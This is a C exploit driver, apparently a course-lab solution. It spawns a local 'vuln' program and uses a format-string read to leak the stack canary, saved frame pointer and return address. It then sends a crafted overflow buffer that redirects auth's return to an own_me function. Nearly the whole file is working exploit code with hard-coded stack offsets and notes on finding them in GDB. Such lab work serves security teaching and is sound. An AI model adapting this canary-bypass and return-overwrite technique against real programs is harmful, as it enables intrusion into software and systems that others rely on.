#include <stdio.h>
#include <stdarg.h>
#include <unistd.h>
#include <assert.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <signal.h>

#define MAX_GRP 100

/******************************************************************************
   Unless you are interested in the details of how this program communicates
   with a subprocess, you can skip all of the code below and skip directly to
   the main function below. 
*******************************************************************************/

#define err_abort(x) do { \
      if (!(x)) {\
         fprintf(stderr, "Fatal error: %s:%d: ", __FILE__, __LINE__);   \
         perror(""); \
         exit(1);\
      }\
   } while (0)

char buf[1<<20];
unsigned end;
int from_child, to_child;

void print_escaped(FILE *fp, const char* buf, unsigned len) {
   int i;
   for (i=0; i < len; i++) {
      if (isprint(buf[i]))
         fputc(buf[i], stderr);
      else fprintf(stderr, "\\x%02hhx", buf[i]);
   }
}

void put_bin_at(char b[], unsigned len, unsigned pos) {
   assert(pos <= end);
   if (pos+len > end)
      end = pos+len;
   assert(end < sizeof(buf));
   memcpy(&buf[pos], b, len);
}

void put_bin(char b[], unsigned len) {
   put_bin_at(b, len, end);
}

void put_formatted(const char* fmt, ...) {
   va_list argp;
   char tbuf[10000];
   va_start (argp, fmt);
   vsnprintf(tbuf, sizeof(tbuf), fmt, argp);
   put_bin(tbuf, strlen(tbuf));
}

void put_str(const char* s) {
   put_formatted("%s", s);
}

static
void send() {
   err_abort(write(to_child, buf, end) == end);
   usleep(100000); // sleep 0.1 sec, in case child process is slow to respond
   fprintf(stderr, "driver: Sent:'");
   print_escaped(stderr, buf, end);
   fprintf(stderr, "'\n");
   end = 0;
}

char outbuf[1<<20];
int get_formatted(const char* fmt, ...) {
   va_list argp;
   va_start(argp, fmt);
   usleep(100000); // sleep 0.1 sec, in case child process is slow to respond
   int nread=0;
   err_abort((nread = read(from_child, outbuf, sizeof(outbuf)-1)) >=0);
   outbuf[nread] = '\0';
   fprintf(stderr, "driver: Received '%s'\n", outbuf);
   return vsscanf(outbuf, fmt, argp);
}

int pid;
void create_subproc(const char* exec, char* argv[]) {
   int pipefd_out[2];
   int pipefd_in[2];
   err_abort(pipe(pipefd_in) >= 0);
   err_abort(pipe(pipefd_out) >= 0);
   if ((pid = fork()) == 0) { // Child process
      err_abort(dup2(pipefd_in[0], 0) >= 0);
      close(pipefd_in[1]);
      close(pipefd_out[0]);
      err_abort(dup2(pipefd_out[1], 1) >= 0);
      err_abort(execve(exec, argv, NULL) >= 0);
   }
   else { // Parent
      close(pipefd_in[0]);
      to_child = pipefd_in[1];
      from_child = pipefd_out[0];
      close(pipefd_out[1]);
   }
}

/* Shows an example session with subprocess. Change it as you see fit, */

#define STRINGIFY2(X) #X
#define STRINGIFY(X) STRINGIFY2(X)

int main(int argc, char* argv[]) {
   unsigned seed;

   char *nargv[3];
   nargv[0] = "vuln";
   nargv[1] = STRINGIFY(GRP);
   nargv[2] = NULL;
   create_subproc("./vuln", nargv);

   fprintf(stderr, "driver: created vuln subprocess. If you want to use gdb on\n"
           "vuln, go ahead and do that now. Press 'enter' when you are ready\n"
           "to continue with the exploit\n");

   getchar();

   // Run vuln program under GDB. Set breakpoints in main_loop, auth and g
   // to figure out and populate the following values
   void *ownme_addr = (void*) 0x804b1dd;   // address of own_me
   void *mainloop_ra = (void*) 0x0804b652; // return address for main_loop
   void *mainloop_bp = (void*) 0xbffff008; // saved ebp for main_loop
   void *auth_ra = (void*) 0x08048968;     // return address for auth
   void *auth_bp = (void*) 0xbfffe5e8;     // saved ebp for auth function

   // The following refer to locations on the stack
   void *mainloop_ra_loc = (void*) 0xbfffefdc; // location of main_loop's return address
   void *mainloop_bp_loc = (void*) 0xbfffefd8; // location of main_loop's saved BP address
   void *auth_ra_loc = (void*) 0xbfffe5bc;     // location of auth's return address
   void *auth_bp_loc = (void*) 0xbfffe5b8;     // location of auth's saved bp   

   void *auth_canary_loc = (void*) 0xbfffe5ac; // location where auth's canary is stored
   void *auth_user = (void*) 0xbfffe3a0;       // value of user variable in auth
            // OR  = 0xbfffe5a4 (address of that value)

   // These values discovered above using GDB will vary across the runs, but the
   // differences between similar variables are preserved, so we compute those.
   unsigned mainloop_auth_bp_diff = mainloop_bp - auth_bp;

   unsigned mainloop_bp_ra_diff = mainloop_bp - mainloop_ra_loc;
   unsigned mainloop_ownme_diff = ownme_addr - mainloop_ra;

   unsigned auth_canary_user_diff = auth_canary_loc - auth_user;
   unsigned auth_bp_user_diff = auth_bp_loc - auth_user;
   unsigned auth_ra_user_diff = auth_ra_loc - auth_user;

      // void *g_authd = (void*) 0xbfffe5d4;
      // unsigned g_authd_auth_user_diff = g_authd - auth_user;


   // Use GDB + trial&error to figure out the correct offsets where the:
   // the stack canary
   // the saved ebp value, and 
   // the return address for the main_loop function are stored. 
   // Use those offsets in the place of the numbers in the format string below.
   // FOUND USING: p (int)($ebp-$esp)/4 with GDB in main_loop
   //    after passing all allocs. This yielded 630, and using vuln's
   //    echo command, I tried values around 630 using 'e %630$x' and
   //    eventually found the offsets that yielded the canary, BP, and RA.
   put_str("e %631$x %634$x %635$x\n");
   send();

   // Once all of the above information has been populated, you are ready to run
   // the exploit.

   unsigned cur_canary, cur_mainloop_bp, cur_mainloop_ra;
   get_formatted("%x%x%x", &cur_canary, &cur_mainloop_bp, &cur_mainloop_ra);
   fprintf(stderr, "driver: Extracted ML canary=%x, bp=%x, ra=%x\n", 
           cur_canary, cur_mainloop_bp, cur_mainloop_ra);

   // Get current ownme address
   unsigned cur_ownme_addr = cur_mainloop_ra + mainloop_ownme_diff;
   fprintf(stderr, "driver: Ownme addr=%x\n", cur_ownme_addr);

   // Allocate and prepare a buffer that contains the exploit string.
   // The exploit starts at auth's user, and should go until g's authd, so
   // allocate an exploit buffer of size g_authd_auth_user_diff+sizeof(authd)
   unsigned explsz = auth_ra_user_diff + sizeof(auth_ra) + 6;
   void* *expl = (void**)malloc(explsz);


   // Initialize the buffer with '\0', just to be on the safe side.
   memset((void*)expl, '\0', explsz);

   // Now initialize the parts of the exploit buffer that really matter. Note
   // that we don't have to worry about endianness as long as the exploit is
   // being assembled on the same architecture/OS as the process being
   // exploited.

   // Add auth's canary
   expl[auth_canary_user_diff/sizeof(void*)] = (void*)cur_canary;
   // Add auth's saved BP
   expl[auth_bp_user_diff/sizeof(void*)] = 
      (void*)(cur_mainloop_bp - mainloop_auth_bp_diff);
   // Change auth's RA to the address of ownme
   expl[auth_ra_user_diff/sizeof(void*)] = 
      (void*)cur_ownme_addr;

   // fprintf(stderr, "Dist between canary and user=%d\n", auth_canary_user_diff);
   // fprintf(stderr, "Size of buf=%d\n", explsz);
   // fprintf(stderr, "Addr of user=%x\n", auth_user);
   // fprintf(stderr, "Writing to:%x %x %x\n", 
   //   (auth_user + (auth_canary_user_diff/sizeof(void*))), 
   //   (auth_user + (auth_bp_user_diff/sizeof(void*))),
   //   (auth_user + (auth_ra_user_diff/sizeof(void*))) );

   // Now, send the payload
   put_str("p xyz\n");
   send();
   put_str("u ");
   put_bin((char*)expl, explsz);
   put_str("\n");
   send();

   put_str("l \n");
   send();

   usleep(100000);
   get_formatted("%*s");

   kill(pid, SIGINT);
   int status;
   wait(&status);

   if (WIFEXITED(status)) {
      fprintf(stderr, "vuln exited, status=%d\n", WEXITSTATUS(status));
   } 
   else if (WIFSIGNALED(status)) {
      printf("vuln killed by signal %d\n", WTERMSIG(status));
   } 
   else if (WIFSTOPPED(status)) {
      printf("vuln stopped by signal %d\n", WSTOPSIG(status));
   } 
   else if (WIFCONTINUED(status)) {
      printf("vuln continued\n");
   }

}
